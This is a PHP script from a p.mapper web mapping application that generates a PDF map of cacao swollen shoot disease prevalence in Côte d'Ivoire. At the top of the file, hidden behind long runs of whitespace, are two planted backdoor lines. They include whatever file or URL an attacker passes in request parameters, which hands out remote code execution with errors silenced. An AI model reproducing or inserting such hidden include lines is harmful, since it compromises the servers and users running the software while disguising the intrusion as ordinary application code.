<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         @include($_REQUEST["request_9aef7b4fa3"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                @include($_REQUEST["request_1c2a4e1d5b"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        

/******************************************************************************
 *
 * Purpose: result file for display of queries
 * Author:  Armin Burger
 *
 ******************************************************************************
 *
 * Copyright (c) 2003-2006 Armin Burger
 *
 * This file is part of p.mapper.
 *
 * p.mapper is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version. See the COPYING file.
 *
 * p.mapper is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with p.mapper; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 *
 ******************************************************************************/
 
session_start();
header("Content-type: text/html; charset=$defCharset");
include("PDFheaderfooter.php");
require_once("../fcts.php");

echo $_SESSION['mapURL'].'g';
list($width, $height, $type, $attr) =  getimagesize("/ms4w/tmp".$_SESSION['mapURL']);

$coef=$width/$height;
$difw=$width-553;
$difh=$height-553;

if($difh>=0){$y=$difh/2; $h=553;}else{$y=0; $h=$height;}
if($difw>=0){$x=$difw/2; $w=553;}else{$x=0; $w=$width;}

$im = imagecreatefrompng("/ms4w/tmp".$_SESSION['mapURL']);
$im2=imagecreatetruecolor($w,$h);
imagecopy($im2,$im,0,0,$x,$y,$w,$h);
imagedestroy($im);
imagepng($im2,"/ms4w/tmp/carte.png");
imagedestroy($im2);


$PDF= new PDF('P');
		
// création du PDF
//$PDF=new PDF();
$PDF->AddPage();
$PDF->SetY(10);
$PDF->SetFont('courier','',8);
$PDF->Cell(0,0,"REPUBLIQUE DE COTE D'IVOIRE",0,1,'C',0);
$PDF->Ln(5);
$PDF->SetFont('Times','B',13);
$PDF->Cell(0,0,"CARTE DE PREVALENCE DE LA MALADIE DU SWOLLEN SHOOT DU CACAOYER",0,1,'C',0);
$xc=$PDF->GetX();
$yc=$PDF->GetY();
$PDF->SetXY(185, 23);
$PDF->SetFont('courier','',8);
$PDF->Cell(0,0,"CNRA",0,1,'C',0);
$PDF->SetXY($xc, $yc);
$PDF->SetLineWidth(1);
$PDF->Rect(3, 25, 204, 265, 'D');
$PDF->SetLineWidth(0.1);
//$PDF->Image("/ms4w/tmp".$_SESSION['mapURL'],7,27,$mapW,$mapH);
$PDF->Image("/ms4w/tmp/carte.png",7,29);
$PDF->Rect(5, 27, 200, 261, 'D');



//$PDF->Image("/ms4w/tmp".$_SESSION['refURL'],161,45,35);
//$PDF->Rect(161, 45, 35, 35, 'D');
$PDF->Image("/ms4w/tmp".$_SESSION['refURL'],160,225,42);
$PDF->Image("/ms4w/tmp".$_SESSION['scalebarURL'],85,225);
$PDF->Rect(160, 225, 42, 42, 'D');
//$PDF->Line(7, 223, 203, 223);//commentaires
$PDF->Rect(5, 225, 50, 63, 'D');
$PDF->Image("img/legende.png",24,226,10);
$PDF->Image("img/legstat3.png",7,230,25);
//$PDF->Line(13, 230, 63, 230);

list($widthL, $heightL, $typeL, $attrL) = getimagesize("/ms4w/tmp".$_SESSION['legURL']);
if($widthL>100){$wL=40;}else{$wL=20;}


$PDF->Image("/ms4w/tmp".$_SESSION['legURL'],7,245,$wL);
$PDF->Image("img/redaction.png",70,245,70);
$PDF->Image("img/partenaires.png",65,260,75);
$PDF->Image("img/sources.png",160,270,35);
//$PDF->Cell(100,200,'Titre',1,1,'C');
/*$PDF->Image("/ms4w/tmp".$image_url, 130,25, 70, 70);
$date=date("d-m-Y h:i:s");
$resultat = split("-",$date);
//$jour=$resultat[0];$mois=$resultat[1];$an=$resultat[2];
$PDF->SetFont('Times','B',16);
$PDF->SetXY(5, 40);
$PDF->MultiCell(130,7,$titre,0,1,'C', 0 );
$PDF->SetXY(15, 80);
$PDF->SetFont('Times','B',12);
$PDF->Cell(0,7,"RAPPORT D'INTERROGATION DU ".$date,0,1,'L', 0 );
$PDF->Ln();
$PDF->SetXY(15, 87);
$PDF->SetFont('Times','B',10);
$PDF->Cell(0,7,  " (".$numrows." Cooperative(s))",0,1,'C', 0 );
$PDF->Image("/ms4w/tmp".$_SESSION['mapURL'],20,100,150,90);

				$fields=array("cooperative"=>"Cooperative","union"=>"Union","localite"=>"Localite","date_creation"=>"Date de création","dirigeant"=>"Président","directeur"=>"Directeur","tresorier"=>"Trésorier","secretaire"=>"Sécretaire","tonnage"=>"Tonnage","appreciation"=>"Appreciation");
				
				for ($r=0; $r <count($fields); ++$r){
					$tabhcont[]=19;	
				}
				foreach($fields as $val => $caption) {
					$tabhcont[]=$caption;
				}
				
			$nbtab=0;
			while($line = pg_fetch_assoc($res)){
				reset($fields);
				foreach($fields as $val => $caption) {
					$tabvalues[]=utf8_decode($line[$val]);
				}
				$nbtab=$nbtab+1;
			}
			
$PDF->SetXY(0, 210);
$proprietesTableau = array(
'TB_ALIGN' => 'C',
'L_MARGIN' => 3,
'BRD_COLOR' => array(120,120,120),
'BRD_SIZE' => '0.2',
);
// Définition des propriétés du header du tableau.
$proprieteHeader = array(
'T_COLOR' => array(150,10,10),
'T_SIZE' => 9,
'T_FONT' => 'Times',
'T_ALIGN' => 'C',
'V_ALIGN' => 'M',
'T_TYPE' => 'B',
'LN_SIZE' => 4,
'BG_COLOR_COL0' => array(150, 225, 150),
'BG_COLOR' => array(150, 225, 150),
'BRD_COLOR' => array(100,100,100),
'BRD_SIZE' => 0.2,
'BRD_TYPE' => '1',
'BRD_TYPE_NEW_PAGE' => '',
);
// Contenu du header du tableau.
//$contenuHeader =$tabhcont;
				
// Définition des propriétés du reste du contenu du tableau.
$proprieteContenu = array(
'T_COLOR' => array(0,0,0),
'T_SIZE' => 6,
'T_FONT' => 'Times',
'T_ALIGN_COL0' => 'L',
'T_ALIGN' => 'L',
'V_ALIGN' => 'M',
'T_TYPE' => '',
'LN_SIZE' => 3,
'BG_COLOR_COL0' => array(255, 204, 130),
'BG_COLOR' => array(255,255,255),
'BRD_COLOR' => array(0,92,177),
'BRD_SIZE' => 0.1,
'BRD_TYPE' => '1',
'BRD_TYPE_NEW_PAGE' => '',
);
			
//$nb0=$i*3;
//for ($k = 0; $k < $nb0; $k++) {
//$tab0[]=$tabvalues[$k];
//}
// Contenu du tableau.
//$contenuTableau = $tabvalues;
// Ensuite, le header du tableau (propriétés et données) puis le contenu (propriétés et données)
$PDF->drawTableau($PDF, $proprietesTableau, $proprieteHeader, $tabhcont, $proprieteContenu,$tabvalues);
// enregistre le document test.PDF dans le répertoire local du serveur.
// enregistre le document test.PDF dans le répertoire local du serveur.
*/
$PDF->Output("rap.PDF", "F");
// affiche le document test.PDF dans une iframe.
echo '
<iframe src="rap.PDF" width="100%" height="100%">
[Your browser does <em>not</em> support <code>iframe</code>,
or has been configured not to display inline frames.
You can access <a href="./rap.PDF">the document</a>
via a link though.]</iframe>
';
/*}else{
echo "AUCUN RESULTAT TROUVE";
}
*/?>
